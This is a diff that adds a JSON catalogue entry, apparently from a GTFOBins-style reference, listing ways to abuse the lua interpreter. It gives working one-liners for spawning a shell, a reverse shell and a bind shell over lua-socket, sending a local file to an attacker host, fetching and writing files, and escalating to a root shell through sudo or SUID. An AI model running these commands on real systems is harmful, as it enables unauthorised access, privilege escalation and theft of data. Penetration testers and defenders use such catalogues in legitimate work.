@@ -1,0 +1,53 @@
+{
+  "functions": {
+    "shell": [
+      {
+        "code": "lua -e 'os.execute(\"/bin/sh\")'"
+      }
+    ],
+    "non-interactive-reverse-shell": [
+      {
+        "description": "Run 'nc -l -p [port]' on the attacker box to receive the shell. This requires 'lua-socket' installed.",
+        "code": "lua -e 'local s=require(\"socket\");\n  local t=assert(s.tcp());\n  t:connect(\"[host]\",[port]);\n  while true do\n    local r,x=t:receive();local f=assert(io.popen(r,\"r\"));\n    local b=assert(f:read(\"*a\"));t:send(b);\n  end;\n  f:close();t:close();'\n"
+      }
+    ],
+    "non-interactive-bind-shell": [
+      {
+        "description": "Run 'nc [host] [port]' on the attacker box to connect to the shell. This requires 'lua-socket' installed.",
+        "code": "lua -e 'local k=require(\"socket\");\n  local s=assert(k.bind(\"*\",[port]));\n  local c=s:accept();\n  while true do\n    local r,x=c:receive();local f=assert(io.popen(r,\"r\"));\n    local b=assert(f:read(\"*a\"));c:send(b);\n  end;c:close();f:close();'\n"
+      }
+    ],
+    "file-upload": [
+      {
+        "description": "Send a local file via TCP. Run 'nc -l -p [port] > [file]' on the attacker box to collect the file. This requires 'lua-socket' installed.",
+        "code": "lua -e '\n  local f=io.open(\"[file]\", 'rb')\n  local d=f:read(\"*a\")\n  io.close(f);\n  local s=require(\"socket\");\n  local t=assert(s.tcp());\n  t:connect(\"[host]\",[port]);\n  t:send(d);\n  t:close();'\n"
+      }
+    ],
+    "file-download": [
+      {
+        "description": "Fetch a remote file via TCP. Run 'nc [host] [port] < [file]' on the attacker box to send the file. This requires 'lua-socket' to be installed.",
+        "code": "lua -e 'local k=require(\"socket\");\n  local s=assert(k.bind(\"*\",[port]));\n  local c=s:accept();\n  local d,x=c:receive(\"*a\");\n  c:close();\n  local f=io.open(\"[file]\", \"wb\");\n  f:write(d);\n  io.close(f);'\n"
+      }
+    ],
+    "file-write": [
+      {
+        "code": "lua -e 'local f=io.open(\"[file]\", \"wb\"); f:write(\"DATA\"); io.close(f);'"
+      }
+    ],
+    "file-read": [
+      {
+        "code": "lua -e 'local f=io.open(\"[file]\", \"rb\"); print(f:read(\"*a\")); io.close(f);'"
+      }
+    ],
+    "sudo": [
+      {
+        "code": "sudo lua -e 'os.execute(\"/bin/sh\")'"
+      }
+    ],
+    "limited-suid": [
+      {
+        "code": "./lua -e 'os.execute(\"/bin/sh\")'"
+      }
+    ]
+  }
+}
